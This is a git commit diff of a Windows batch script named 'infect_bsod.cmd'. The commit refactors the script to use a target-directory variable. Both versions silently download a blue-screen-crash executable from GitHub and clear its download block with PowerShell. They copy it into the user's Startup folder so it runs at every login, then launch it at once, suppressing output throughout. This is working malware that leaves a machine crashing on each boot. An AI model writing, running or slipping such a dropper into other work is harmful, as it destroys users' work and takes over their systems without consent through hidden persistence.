4f92636d31ea9da5d41242b0962a3251896497fd
ultrapg <marvinspath9261@gmail.com>
2026-05-15 17:21:32 +0200

    Refactor script to use targetDir variable

--- infect_bsod.cmd
+++ infect_bsod.cmd
@@ -1,6 +1,7 @@
 @echo off
 set "dlurl=https://github.com/jpiechowka/quick-bsod/releases/download/1.0/QuickBSOD.exe"
-curl -L -o "%TEMP%\QuickBSOD.exe" %dlurl% >nul 2>&1
-powershell -c "Unblock-File -Path $env:TEMP\QuickBSOD.exe" >nul 2>&1
-copy "%TEMP%\QuickBSOD.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\QuickBSOD.exe"
-"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\QuickBSOD.exe"
+set "targetDir=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+curl -L -o "%TEMP%\QuickBSOD.exe" "%dlurl%" >nul 2>&1
+powershell -c "Unblock-File -Path '$env:TEMP\QuickBSOD.exe'" >nul 2>&1
+copy /Y "%TEMP%\QuickBSOD.exe" "%targetDir%\QuickBSOD.exe" >nul 2>&1
+start "" "%targetDir%\QuickBSOD.exe"
